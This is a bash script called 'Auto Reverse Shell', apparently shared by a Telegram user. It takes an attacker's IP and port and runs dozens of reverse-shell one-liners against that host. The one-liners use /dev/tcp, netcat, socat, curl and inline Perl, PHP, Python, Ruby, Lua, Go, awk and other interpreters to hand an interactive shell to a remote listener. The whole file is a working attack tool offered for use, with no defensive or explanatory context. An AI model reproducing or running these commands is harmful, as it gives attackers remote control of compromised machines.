#!/bin/bash

echo " Auto Reverse Shell"
echo " Telegram @Batosay1337"

if [ $# -ne 2 ]; then
    echo "Usage: $0 [IP] [PORT]"
    exit 1
fi

IP=$1
PORT=$2

echo "Trying to connect to $IP on port $PORT..."
sh -i >& /dev/tcp/$IP/$PORT 0>&1

0<&196;exec 196<>/dev/tcp/$IP/$PORT; sh <&196 >&196 2>&196

exec 5<>/dev/tcp/$IP/$PORT;cat <&5 | while read line; do $line 2>&5 >&5; done

sh -i 5<> /dev/tcp/$IP/$PORT 0<&5 1>&5 2>&5

sh -i >& /dev/udp/$IP/$PORT 0>&1

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $IP $PORT >/tmp/f

nc $IP $PORT -e sh

busybox nc $IP $PORT -e sh

nc -c sh $IP $PORT

ncat $IP $PORT -e sh

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u $IP $PORT >/tmp/f

C='curl -Ns telnet://$IP:$PORT'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null

rcat connect -s sh $IP $PORT

perl -e 'use Socket;$i="$IP";$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'

perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"$IP:$PORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

php -r '$sock=fsockopen("$IP",$PORT);exec("sh <&3 >&3 2>&3");'

php -r '$sock=fsockopen("$IP",$PORT);shell_exec("sh <&3 >&3 2>&3");'

php -r '$sock=fsockopen("$IP",$PORT);system("sh <&3 >&3 2>&3");'

php -r '$sock=fsockopen("$IP",$PORT);passthru("sh <&3 >&3 2>&3");'

php -r '$sock=fsockopen("$IP",$PORT);`sh <&3 >&3 2>&3`;'

php -r '$sock=fsockopen("$IP",$PORT);popen("sh <&3 >&3 2>&3", "r");'

php -r '$sock=fsockopen("$IP",$PORT);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'

export RHOST="$IP";export RPORT=$PORT;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'

export RHOST="$IP";export RPORT=$PORT;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'

python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("$IP",$PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'

ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("$IP",$PORT))'

ruby -rsocket -e'exit if fork;c=TCPSocket.new("$IP","$PORT");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'

socat TCP:$IP:$PORT EXEC:sh

socat TCP:$IP:$PORT EXEC:'sh',pty,stderr,setsid,sigint,sane

sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $IP $PORT >/tmp/f'

require('child_process').exec('nc -e sh $IP $PORT')

TF=$(mktemp -u);mkfifo $TF && telnet $IP $PORT 0<$TF | sh 1>$TF

zsh -c 'zmodload zsh/net/tcp && ztcp $IP $PORT && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'

lua -e "require('socket');require('os');t=socket.tcp();t:connect('$IP','$PORT');os.execute('sh -i <&3 >&3 2>&3');"

lua5.1 -e 'local host, port = "$IP", $PORT local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'

echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","$IP:$PORT");cmd:=exec.Command("sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go

echo 'import os' > /tmp/t.v && echo 'fn main() { os.system("nc -e sh $IP $PORT 0>&1") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v

awk 'BEGIN {s = "/inet/tcp/0/$IP/$PORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

crystal eval 'require "process";require "socket";c=Socket.tcp(Socket::Family::INET);c.connect("$IP",$PORT);loop{m,l=c.receive;p=Process.new(m.rstrip("\n"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}'
